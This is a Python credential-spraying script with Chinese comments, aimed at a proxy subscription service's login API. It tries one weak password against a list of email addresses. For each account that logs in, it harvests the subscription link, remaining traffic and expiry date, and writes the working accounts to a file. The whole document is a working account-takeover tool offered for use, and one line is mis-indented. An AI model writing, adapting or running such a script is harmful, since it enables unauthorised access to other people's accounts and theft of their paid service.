# -*- coding: utf-8 -*-
import requests
import time
import datetime
# import warnings

proxies = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
domain = 'https://xn--4gq62f52gdss.com/'
login_url = domain + 'api/v1/passport/auth/login'
userinfo_link = domain + 'api/v1/user/getSubscribe'

result = []


def get_user(payload):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '
                      'Safari/537.36'}
    post_data = {'email': payload,
                 'password': '自定义弱口令',
                 }
    try:
        resp = requests.post(url=login_url, data=post_data, headers=headers, proxies=proxies, timeout=20)  # 若存在SSL问题，使用verify=False（取消第5、27行注释）
        # warnings.filterwarnings("ignore")  # 使用verify=False时，关闭警告提醒
        print('当前账号：' + payload.strip(), '  页面响应码:', resp.status_code)
        if resp.status_code == 200:
            auth_data = resp.json()['data']['auth_data']  # 获取并传递Authorization，低版本可使用requests.Session()管理会话
            header = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) '
                              'Chrome/108.0.0.0 '
                              'Safari/537.36', 'Authorization': auth_data}
                        resp1 = requests.get(url=userinfo_link, headers=header, proxies=proxies, timeout=20)
            print(resp1.text)
            try:
                if str(resp1.json()["message"]) == "\u8ba2\u9605\u8ba1\u5212\u4e0d\u5b58\u5728":  # 不同机场提示内容不容，根据提示修改
                    print('无订阅计划')
                    return
            except:
                j = resp1.json()["data"]["plan_id"]
                if str(j) != 'None':  # 根据机场套餐id调整
                # if j != 'None' and str(j) != '1':  # 根据机场套餐id调整,当前机场套餐id为1的是体验套餐
                    sub_link = resp1.json()["data"]["subscribe_url"]
                    traffic_download = resp1.json()["data"]["d"]
                    traffic_total = resp1.json()["data"]["transfer_enable"]
                    traffic_balance = str(round((traffic_total - traffic_download) / 1024 / 1024 / 1024, 2))
                    expired_at = resp1.json()["data"]["expired_at"]
                    if str(expired_at) == 'None':
                        expired_at = '未知'
                    elif expired_at <= time.time():
                        return  # 过期订阅直接跳过
                    else:
                        timeStamp = expired_at
                        dateArray = datetime.datetime.utcfromtimestamp(timeStamp)
                        expired_at = dateArray.strftime("%Y-%m-%d %H:%M:%S")
                    sub_plan = resp1.json()["data"]["plan"]["name"]
                    sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')  # linux使用sub_plan.encode('utf-8').decode('unicode_escape')编码
                    result_temp = '账号：' + payload + '密码：' + '【自定义的弱口令】' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + expired_at + '\n' + '订阅链接：' + sub_link + '\n\n'  # 修改【自定义的弱口令】
                    print(result_temp)
                    result.append(result_temp)
                    time.sleep(1)
                else:
                    return  # 无订阅，跳过
        elif resp.status_code == 419 or resp.status_code == 502:
            return get_user(payload)
        else:
            pass
        resp.close()
    except RuntimeError as e:
        print('======连接超时，1s后重新尝试======')
        time.sleep(1)
        return get_user(payload)


if __name__ == "__main__":
    email_list = []
    with open('机场users.txt', 'r', encoding='utf-8') as fp:
        for ff in fp:
            email_list.append(ff)
    fp.close()
    for email in email_list:
        get_user(email)
    with open('user_success.txt', 'a', encoding='utf-8') as f:
        for result1 in result:
            f.write(result1)
    f.close()
